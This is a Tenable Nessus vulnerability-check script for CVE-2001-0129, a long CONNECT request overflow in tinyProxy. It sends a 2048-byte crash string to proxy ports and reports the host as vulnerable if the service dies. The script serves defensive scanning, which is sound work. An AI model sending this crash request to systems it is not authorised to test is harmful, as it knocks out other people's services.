#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10596);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-2001-0129");
 script_bugtraq_id(2217);
 script_osvdb_id(493);
 
 script_name(english:"tinyProxy Long Connect Request Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote proxy server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote service crash
by sending it the command :

	connect AAA[...]AAAA://

It may be possible for an attacker to execute arbitrary code
on this host thanks to this flaw." );
 script_set_attribute(attribute:"solution", value:
"If you are using tinyProxy, then upgrade to version 1.3.3a, or 
else contact your vendor for a patch." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/01/19");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/01/17");
 script_cvs_date("$Date: 2011/03/14 21:48:14 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_summary(english:"proxy server heap overflow");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2001-2011 Tenable Network Security, Inc.");
 script_family(english:"Firewalls");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", "Services/http_proxy", 8888);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

ports = add_port_in_list(list:get_kb_list("Services/http_proxy"), port:8888);
www = get_kb_list("Services/www");
if(!isnull(www))ports = make_list(ports, www);

foreach port (ports)
{
 banner = get_http_banner(port:port);
 if ( banner && "DAAP-Server: iTunes" >< banner ) continue;
 if (! get_port_state(port)) continue;

 if (service_is_dead(port: port) != 0) continue;

 req = strcat('connect ', crap(2048), '://\r\n\r\n');
 r = http_send_recv_buf(port: port, data: req);

 if (service_is_dead(port:port, exit: 0) > 0)
   security_warning(port);
}
